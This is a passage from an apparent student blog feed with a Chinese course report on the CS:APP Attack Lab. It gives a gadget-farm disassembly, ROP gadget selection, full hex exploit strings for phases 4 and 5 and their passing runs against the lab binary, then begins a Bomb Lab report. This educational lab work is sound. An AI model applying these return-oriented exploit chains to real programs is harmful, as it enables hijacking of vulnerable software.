<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004020aa &lt;start_farm&gt;:</span><br><span class="line">  4020aa:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4020ae:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4020b3:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004020b4 &lt;setval_118&gt;:</span><br><span class="line">  4020b4:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4020b8:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4020be:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004020bf &lt;getval_282&gt;:</span><br><span class="line">  4020bf:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4020c3:	b8 48 89 c7 c7       	mov    $0xc7c78948,%eax</span><br><span class="line">  4020c8:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004020c9 &lt;setval_393&gt;:</span><br><span class="line">  4020c9:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4020cd:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4020d3:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004020d4 &lt;setval_245&gt;:</span><br><span class="line">  4020d4:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4020d8:	c7 07 48 8d c7 c3    	movl   $0xc3c78d48,(%rdi)</span><br><span class="line">  4020de:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004020df &lt;getval_494&gt;:</span><br><span class="line">  4020df:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4020e3:	b8 58 90 90 c3       	mov    $0xc3909058,%eax</span><br><span class="line">  4020e8:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004020e9 &lt;addval_281&gt;:</span><br><span class="line">  4020e9:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4020ed:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax</span><br><span class="line">  4020f3:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004020f4 &lt;getval_477&gt;:</span><br><span class="line">  4020f4:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4020f8:	b8 53 58 92 90       	mov    $0x90925853,%eax</span><br><span class="line">  4020fd:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004020fe &lt;getval_279&gt;:</span><br><span class="line">  4020fe:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402102:	b8 2f 58 91 90       	mov    $0x9091582f,%eax</span><br><span class="line">  402107:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402108 &lt;mid_farm&gt;:</span><br><span class="line">  402108:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40210c:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  402111:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402112 &lt;add_xy&gt;:</span><br><span class="line">  402112:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402116:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  40211a:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040211b &lt;addval_303&gt;:</span><br><span class="line">  40211b:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40211f:	8d 87 89 c2 38 c9    	lea    -0x36c73d77(%rdi),%eax</span><br><span class="line">  402125:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402126 &lt;addval_187&gt;:</span><br><span class="line">  402126:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40212a:	8d 87 8b d1 84 d2    	lea    -0x2d7b2e75(%rdi),%eax</span><br><span class="line">  402130:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402131 &lt;addval_460&gt;:</span><br><span class="line">  402131:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402135:	8d 87 89 d1 84 c9    	lea    -0x367b2e77(%rdi),%eax</span><br><span class="line">  40213b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040213c &lt;addval_399&gt;:</span><br><span class="line">  40213c:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402140:	8d 87 a0 89 c2 94    	lea    -0x6b3d7660(%rdi),%eax</span><br><span class="line">  402146:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402147 &lt;getval_305&gt;:</span><br><span class="line">  402147:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40214b:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax</span><br><span class="line">  402150:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402151 &lt;getval_263&gt;:</span><br><span class="line">  402151:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402155:	b8 48 8d e0 c3       	mov    $0xc3e08d48,%eax</span><br><span class="line">  40215a:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040215b &lt;getval_370&gt;:</span><br><span class="line">  40215b:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40215f:	b8 8c 8b d1 90       	mov    $0x90d18b8c,%eax</span><br><span class="line">  402164:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402165 &lt;getval_291&gt;:</span><br><span class="line">  402165:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402169:	b8 48 8d e0 c3       	mov    $0xc3e08d48,%eax</span><br><span class="line">  40216e:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040216f &lt;setval_374&gt;:</span><br><span class="line">  40216f:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402173:	c7 07 89 ce 20 d2    	movl   $0xd220ce89,(%rdi)</span><br><span class="line">  402179:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040217a &lt;getval_294&gt;:</span><br><span class="line">  40217a:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40217e:	b8 48 09 e0 90       	mov    $0x90e00948,%eax</span><br><span class="line">  402183:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402184 &lt;getval_327&gt;:</span><br><span class="line">  402184:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402188:	b8 f4 c9 c2 c3       	mov    $0xc3c2c9f4,%eax</span><br><span class="line">  40218d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040218e &lt;addval_143&gt;:</span><br><span class="line">  40218e:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402192:	8d 87 48 89 e0 90    	lea    -0x6f1f76b8(%rdi),%eax</span><br><span class="line">  402198:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402199 &lt;getval_379&gt;:</span><br><span class="line">  402199:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40219d:	b8 09 ce 90 c3       	mov    $0xc390ce09,%eax</span><br><span class="line">  4021a2:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004021a3 &lt;setval_398&gt;:</span><br><span class="line">  4021a3:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4021a7:	c7 07 89 ce 28 c9    	movl   $0xc928ce89,(%rdi)</span><br><span class="line">  4021ad:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004021ae &lt;setval_215&gt;:</span><br><span class="line">  4021ae:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4021b2:	c7 07 89 d1 84 d2    	movl   $0xd284d189,(%rdi)</span><br><span class="line">  4021b8:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004021b9 &lt;getval_223&gt;:</span><br><span class="line">  4021b9:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4021bd:	b8 89 c2 c3 e2       	mov    $0xe2c3c289,%eax</span><br><span class="line">  4021c2:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004021c3 &lt;addval_468&gt;:</span><br><span class="line">  4021c3:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4021c7:	8d 87 8d d1 84 d2    	lea    -0x2d7b2e73(%rdi),%eax</span><br><span class="line">  4021cd:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004021ce &lt;addval_350&gt;:</span><br><span class="line">  4021ce:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4021d2:	8d 87 89 ce 08 c9    	lea    -0x36f73177(%rdi),%eax</span><br><span class="line">  4021d8:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004021d9 &lt;addval_146&gt;:</span><br><span class="line">  4021d9:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4021dd:	8d 87 8b d1 90 c3    	lea    -0x3c6f2e75(%rdi),%eax</span><br><span class="line">  4021e3:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004021e4 &lt;setval_161&gt;:</span><br><span class="line">  4021e4:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4021e8:	c7 07 89 c2 18 db    	movl   $0xdb18c289,(%rdi)</span><br><span class="line">  4021ee:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004021ef &lt;getval_254&gt;:</span><br><span class="line">  4021ef:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4021f3:	b8 89 ce 18 c9       	mov    $0xc918ce89,%eax</span><br><span class="line">  4021f8:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004021f9 &lt;addval_476&gt;:</span><br><span class="line">  4021f9:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4021fd:	8d 87 6c 89 ce c7    	lea    -0x38317694(%rdi),%eax</span><br><span class="line">  402203:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402204 &lt;getval_136&gt;:</span><br><span class="line">  402204:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402208:	b8 09 c2 84 d2       	mov    $0xd284c209,%eax</span><br><span class="line">  40220d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040220e &lt;addval_428&gt;:</span><br><span class="line">  40220e:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402212:	8d 87 d1 a9 c2 90    	lea    -0x6f3d562f(%rdi),%eax</span><br><span class="line">  402218:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402219 &lt;getval_341&gt;:</span><br><span class="line">  402219:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40221d:	b8 81 ce 08 c9       	mov    $0xc908ce81,%eax</span><br><span class="line">  402222:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402223 &lt;getval_172&gt;:</span><br><span class="line">  402223:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402227:	b8 48 89 e0 c7       	mov    $0xc7e08948,%eax</span><br><span class="line">  40222c:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040222d &lt;getval_435&gt;:</span><br><span class="line">  40222d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402231:	b8 d9 4c 89 e0       	mov    $0xe0894cd9,%eax</span><br><span class="line">  402236:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402237 &lt;getval_262&gt;:</span><br><span class="line">  402237:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40223b:	b8 8b d1 20 d2       	mov    $0xd220d18b,%eax</span><br><span class="line">  402240:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402241 &lt;setval_323&gt;:</span><br><span class="line">  402241:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402245:	c7 07 68 89 e0 c3    	movl   $0xc3e08968,(%rdi)</span><br><span class="line">  40224b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040224c &lt;getval_214&gt;:</span><br><span class="line">  40224c:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402250:	b8 ee 8b c2 90       	mov    $0x90c28bee,%eax</span><br><span class="line">  402255:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402256 &lt;setval_220&gt;:</span><br><span class="line">  402256:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40225a:	c7 07 c9 ce 90 90    	movl   $0x9090cec9,(%rdi)</span><br><span class="line">  402260:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402261 &lt;getval_194&gt;:</span><br><span class="line">  402261:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402265:	b8 89 d1 00 c0       	mov    $0xc000d189,%eax</span><br><span class="line">  40226a:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040226b &lt;end_farm&gt;:</span><br><span class="line">  40226b:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40226f:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  402274:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>和Level 2一样将<code>cookie</code>存储进寄存器<code>%rdi</code>内。所以需要在<code>rterget</code>中找到相应<code>gadget</code>，可以凑出相应的能够实现攻击的指令。先将寄存器<code>%rax</code>的值设置为<code>cookie</code>，然后复制给<code>%rdi</code>。，可以拼凑出代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/attacklab/7.png" alt="img"></p>
<p><img src="/img/jj/attacklab/8.png" alt="img"></p>
</li>
<li><p>查表知，<code>pop %rax</code>用<code>58</code>表示，查找<code>58</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004020e9 &lt;addval_281&gt;:</span><br><span class="line">  4020e9:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4020ed:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax</span><br><span class="line">  4020f3:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>得到指令地址为<code>0x4020ef</code></p>
</li>
<li><p><code>movq %rax, %rdi</code>表示为<code>48 89 c7</code>，其中 90 表示“空”，可以忽略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004020c9 &lt;setval_393&gt;:</span><br><span class="line">  4020c9:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4020cd:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4020d3:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>得到指令地址为<code>0x4020cf</code></p>
</li>
<li><p>故攻击字符串<code>level4.txt</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">//以上代码填满整个缓冲区以致溢出</span><br><span class="line">ef 20 40 00 00 00 00 00</span><br><span class="line">//用gadget1(popq %rat   ret)的起始地址覆盖原先的返回地址</span><br><span class="line">bc 75 5f 17 00 00 00 00</span><br><span class="line">//cookie</span><br><span class="line">cf 20 40 00 00 00 00 00 </span><br><span class="line">//gadget2(mov %rax,%rdi   ret)的起始地址</span><br><span class="line">e0 1e 40 00 00 00 00 00</span><br><span class="line">//touch2的起始地址</span><br></pre></td></tr></table></figure>
</li>
<li><p>发起进攻：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ouc@islouc-vm:~/Desktop/target393$ ./hex2raw &lt; level4.txt &gt; level4raw.txt</span><br><span class="line">ouc@islouc-vm:~/Desktop/target393$ ./rtarget -qi level4raw.txt</span><br><span class="line"></span><br><span class="line">Cookie: 0x175f75bc</span><br><span class="line">Touch2!: You called touch2(0x175f75bc)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user <span class="built_in">id</span>	22090001016</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	393:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 EF 20 40 00 00 00 00 00 BC 75 5F 17 00 00 00 00 CF 20 40 00 00 00 00 00 E0 1E 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/attacklab/9.png" alt="img"></p>
</li>
</ul>
<h3 id="·-第五关："><a href="#·-第五关：" class="headerlink" title="· 第五关："></a>· 第五关：</h3><ul>
<li><p>要求：</p>
<ol>
<li>只能使用前八个x86-64寄存器 <code>%rax-%rdi</code> ；</li>
<li>可以使用 <code>movq</code>， <code>movl</code>， <code>popq</code>， <code>ret</code>， <code>nop</code>的 <code>gadget</code>；</li>
<li>可以使用在 <code>rtarget</code>代码中在 <code>start_farm</code>和 <code>end_farm</code>区域内的任意 <code>gadget</code>完成攻击；</li>
<li>至少需要8个 <code>gadget</code>实现此次攻击。</li>
</ol>
</li>
<li><p>本题的任务与<code>Phase 3</code>相同，都是要求返回到<code>touch3</code>函数</p>
<p><code>Phase 3</code>中用到的注入代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov	$0x55613b38, %rdi</span><br><span class="line">pushq	$0x402005</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>Phase 3</code>一样，需要将寄存器<code>%rdi</code>的值设置为<code>cookie</code>字符串的指针，即存储<code>cookie</code>字符串的地址。</p>
</li>
<li><p>找到满足要求的<code>gadget</code>拼凑出攻击指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq   %rsp,%rax    //传递栈顶位置栈顶位置</span><br><span class="line">//因为不能将cookie字符串存储在栈顶位置，需要另找位置,将cookie字符串存储在rsp+x处</span><br><span class="line">add    $x  ,%rax    </span><br><span class="line">movq   %rax,%rdi    //将cookie字符串地址传递给%rdi</span><br></pre></td></tr></table></figure>
</li>
<li><p>因此我们需要找到一个能够实现加法或减法的运算的<code>gadget</code>，但是参考文件中并没有相关的字节编码，需要寻找其他方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000402112 &lt;add_xy&gt;:</span><br><span class="line">  402112:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402116:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  40211a:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>通过观察可以通过上述代码来实现一个加法运算，<code>lea (%rdi,%rsi,1) %rax</code>的是<code>%rax = %rdi + %rsi</code>传递的是地址，所以只要能够让<code>%rdi</code>和<code>%rsi</code>其中一个保存<code>%rsp</code>，另一个保存从stack中<code>pop</code>出来的偏移值，就可以表示<code>cookie</code>字符串存放的地址。所以分成两部分代码：</p>
<ol>
<li>把<code>%rsp</code>存放到<code>%rdi</code>中</li>
<li>把偏移值(需要确定指令数后才能确定)存放到<code>%rsi</code>中</li>
</ol>
</li>
<li><p>在上述代码中并没有<code>movq %rax,%rsi</code>的gadget，只能通过过<code>%eax</code>-&gt;<code>%edx</code>-&gt;<code>%ecx</code>-&gt;<code>%esi</code>来实现。即将<code>%eax</code>的值设置为<code>cookie</code>字符串地址在栈中的偏移量并复制给<code>%esi</code><br>需要注意的是，上面两部分完成任务的寄存器不能互换，因为从<code>%eax</code>到<code>%esi</code>的值传递<code>mov</code>指令都是<code>4byte</code>的操作，如果对<code>%rsp</code>的值采用这种方式，<code>%rsp</code>的值会被截断掉，最后的结果就错了。但是偏移值不会，因为4个bytes足够表示了。</p>
</li>
<li><p>最后的指令为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov   %rsp,%rax</span><br><span class="line">ret</span><br><span class="line">mov   %rax,%rdi   #先将栈顶%rsp存入%rdi内</span><br><span class="line">ret</span><br><span class="line">popq  %rax         #将偏移量赋值给%eax</span><br><span class="line">ret                 </span><br><span class="line">movl  %eax,%edx    </span><br><span class="line">ret</span><br><span class="line">movl  %edx,%ecx</span><br><span class="line">ret</span><br><span class="line">movl  %ecx,%esi   #%esi = 偏移量</span><br><span class="line">ret</span><br><span class="line">lea   (%rdi,%rsi,1),%rax #%rax = %rsp + 偏移量</span><br><span class="line">ret</span><br><span class="line">mov   %rax,%rdi    #%rdi = cookie字符地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到在返回地址和字符串首地址之间有9条指令，每个指令8个byte，共72 byte也就是<code>0x48</code>。</p>
</li>
<li><p>攻击字符串<code>level5.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">// 以上代码填满整个缓冲区以致溢出</span><br><span class="line">94 21 40 00 00 00 00 00  //movq %rsp,%rax</span><br><span class="line">cf 20 40 00 00 00 00 00  //movq %rax,%rdi</span><br><span class="line">ef 20 40 00 00 00 00 00  //popq %rax</span><br><span class="line">48 00 00 00 00 00 00 00  //偏移值</span><br><span class="line">ea 21 40 00 00 00 00 00  //movl %eax,%edx</span><br><span class="line">b4 21 40 00 00 00 00 00  //movl %edx,%ecx</span><br><span class="line">a9 21 40 00 00 00 00 00  //movl %ecx,%esi</span><br><span class="line">16 21 40 00 00 00 00 00  //lea (%rsi,%rdi,1) %rax</span><br><span class="line">cf 20 40 00 00 00 00 00  //movq %rax,%rdi</span><br><span class="line">05 20 40 00 00 00 00 00  //touch3的起始地址</span><br><span class="line">31 37 35 66 37 35 62 63 00 //cookie字符串</span><br></pre></td></tr></table></figure>
</li>
<li><p>发起总攻：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ouc@islouc-vm:~/Desktop/target393$ ./hex2raw &lt; level5.txt &gt; level5raw.txt</span><br><span class="line">ouc@islouc-vm:~/Desktop/target393$ ./rtarget -qi level5raw.txt</span><br><span class="line"></span><br><span class="line">Cookie: 0x175f75bc</span><br><span class="line">Touch3!: You called touch3(<span class="string">&quot;175f75bc&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user <span class="built_in">id</span>	22090001016</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	393:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 94 21 40 00 00 00 00 00 CF 20 40 00 00 00 00 00 EF 20 40 00 00 00 00 00 48 00 00 00 00 00 00 00 EA 21 40 00 00 00 00 00 B4 21 40 00 00 00 00 00 A9 21 40 00 00 00 00 00 16 21 40 00 00 00 00 00 CF 20 40 00 00 00 00 00 05 20 40 00 00 00 00 00 31 37 35 66 37 35 62 63 00 </span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/attacklab/10.png" alt="img"></p>
</li>
</ul>
<h2 id="四、实验结果："><a href="#四、实验结果：" class="headerlink" title="四、实验结果："></a>四、实验结果：</h2><h3 id="·-Phase-1"><a href="#·-Phase-1" class="headerlink" title="· Phase 1"></a>· Phase 1</h3><p><img src="/img/jj/attacklab/1.png" alt="img"></p>
<h3 id="·-Phase-2"><a href="#·-Phase-2" class="headerlink" title="· Phase 2"></a>· Phase 2</h3><p><img src="/img/jj/attacklab/4.png" alt="img"></p>
<h3 id="·-Phase-3"><a href="#·-Phase-3" class="headerlink" title="· Phase 3"></a>· Phase 3</h3><p><img src="/img/jj/attacklab/6.png" alt="img"></p>
<h3 id="·-Phase-4"><a href="#·-Phase-4" class="headerlink" title="· Phase 4"></a>· Phase 4</h3><p><img src="/img/jj/attacklab/9.png" alt="img"></p>
<h3 id="·-Phase-5"><a href="#·-Phase-5" class="headerlink" title="· Phase 5"></a>· Phase 5</h3><p><img src="/img/jj/attacklab/10.png" alt="img"></p>
<h2 id="五、实验总结："><a href="#五、实验总结：" class="headerlink" title="五、实验总结："></a>五、实验总结：</h2><blockquote>
<ul>
<li><p>Attack Lab的完成过程让我深入学习了计算机安全领域的基本概念和实践技能。以下是我在每个关卡中的经验与心得：</p>
</li>
<li><h3 id="第一关（Phase-1）："><a href="#第一关（Phase-1）：" class="headerlink" title="第一关（Phase 1）："></a>第一关（Phase 1）：</h3><p>通过使用 <code>hex2raw</code> 将文本数据转换为二进制形式，我成功利用 <code>ctarget</code> 攻击了目标，触发了 <code>touch1()</code> 函数。这一关让我了解了如何利用栈溢出漏洞，并初步认识了二进制攻击的原理。</p>
</li>
<li><h3 id="第二关（Phase-2）："><a href="#第二关（Phase-2）：" class="headerlink" title="第二关（Phase 2）："></a>第二关（Phase 2）：</h3><p>利用程序中的栈溢出漏洞，我成功触发了 <code>touch2(0x175f75bc)</code> 函数。这一关深化了我对栈溢出攻击的理解，学到了如何操纵程序的执行流程，实现对指定函数的调用。</p>
</li>
<li><h3 id="第三关（Phase-3）："><a href="#第三关（Phase-3）：" class="headerlink" title="第三关（Phase 3）："></a>第三关（Phase 3）：</h3><p>通过利用字符串格式化漏洞，我成功触发了 <code>touch3(&quot;175f75bc&quot;)</code> 函数。这一关让我更深入地了解了格式化字符串攻击的原理，对不同类型的漏洞有了更全面的认识。</p>
</li>
<li><h3 id="第四关（Phase-4）："><a href="#第四关（Phase-4）：" class="headerlink" title="第四关（Phase 4）："></a>第四关（Phase 4）：</h3><p>利用Return-Oriented Programming (ROP)攻击技术，我成功触发了 <code>touch2(0x175f75bc)</code> 函数。深入了解ROP攻击，了解了在没有执行可执行代码的情况下实现攻击的方法，对于更高级的攻击技术有了一定了解。</p>
</li>
<li><h3 id="第五关（Phase-5）："><a href="#第五关（Phase-5）：" class="headerlink" title="第五关（Phase 5）："></a>第五关（Phase 5）：</h3><p>通过ROP攻击成功触发了 <code>touch3(&quot;175f75bc&quot;)</code> 函数。这一关让我更深入地掌握了ROP攻击技术，对于构建ROP链和在实际攻击中如何利用已有的程序片段有了更深入的认识。</p>
</li>
<li><p>总的来说，Attack Lab为我提供了一个深入了解计算机安全领域的机会。通过实际的攻击任务，我不仅学到了各种攻击技术，还提高了解决问题和调试程序的能力。这次实验为我未来深入学习和从事计算机安全领域奠定了坚实的基础。</p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>作业</tag>
        <tag>实验报告</tag>
        <tag>计算机系统基础</tag>
        <tag>计基</tag>
        <tag>拆弹</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机系统基础-Bomb Lab 实验报告</title>
    <url>/posts/bomblab.html</url>
    <content><![CDATA[<h1 id="中国海洋大学-计算机科学与技术系"><a href="#中国海洋大学-计算机科学与技术系" class="headerlink" title="中国海洋大学 计算机科学与技术系"></a><strong><center>中国海洋大学 计算机科学与技术系</center></strong></h1><h2 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a><u><center>实验报告</center></u></h2><blockquote>
<p><strong>姓名</strong>：火</p>
<p><strong>年级</strong>：2022</p>
<p><strong>专业</strong>：</p>
<p><strong>科目</strong>：计算机系统原理</p>
<p><strong>题目</strong>：Bomb Lab</p>
<p><strong>实验时间</strong>：2023/12/15</p>
<p><strong>实验成绩</strong>：</p>
<p><strong>实验教师</strong>：</p>
</blockquote>
<h2 id="一、实验目的："><a href="#一、实验目的：" class="headerlink" title="一、实验目的："></a>一、实验目的：</h2><ol>
<li>学习并熟练使用<code>gdb</code>调试器和<code>objdump</code></li>
<li>理解汇编语言代码的行为或作用</li>
<li>提高阅读和理解汇编代码的能力</li>
</ol>
<h2 id="二、实验要求："><a href="#二、实验要求：" class="headerlink" title="二、实验要求："></a>二、实验要求：</h2><p>实验共包括七个阶段，每个阶段考察机器级语言程序的不同方面，难度递增</p>
<blockquote>
<ul>
<li><strong>阶段一</strong>：字符串比较</li>
<li><strong>阶段二</strong>：循环</li>
<li><strong>阶段三</strong>：条件/分支，含switch语句</li>
<li><strong>阶段四</strong>：递归调用和栈</li>
<li><strong>阶段五</strong>：指针</li>
<li><strong>阶段六</strong>：链表/指针/结构</li>
<li><strong>隐藏阶段</strong>：阶段四之后附加特定字符串后出现</li>
</ul>
</blockquote>
<h2 id="三、实验内容："><a href="#三、实验内容：" class="headerlink" title="三、实验内容："></a>三、实验内容：</h2><h3 id="·-拆弹前准备"><a href="#·-拆弹前准备" class="headerlink" title="· 拆弹前准备"></a><code>· 拆弹前准备</code></h3><p>打开解压好的<code>bomb18</code>文件夹，其中有我们本次实验的目标文件<code>bomb</code>和<code>bomb.c</code>源文件</p>
<p><img src="/img/jj/bomblab/1.png" alt="img"></p>
<p>用<code>Visual Studio Code</code>打开之后发现</p>
<p><img src="/img/jj/bomblab/2.png" alt="img"></p>
<p>主函数<code>main</code>下有六个主要部分构成，分别对应着六个阶段（phase），</p>
<p>每个部分都由</p>
<p>输入函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">input = read_line();</span><br></pre></td></tr></table></figure>
<p>炸弹函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">phase_x(input);</span><br></pre></td></tr></table></figure>
<p>拆除成功函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">phase_defused();</span><br></pre></td></tr></table></figure>
<p>提示语</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;xxxxxxxxxx&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>显然我们应该关注的是炸弹函数<code>phase_x（x=1,2,…,6）</code></p>
<p>但是我们注意到最后的注释部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span></span><br><span class="line"><span class="comment"> * something they overlooked?  Mua ha ha ha ha! */</span></span><br></pre></td></tr></table></figure>
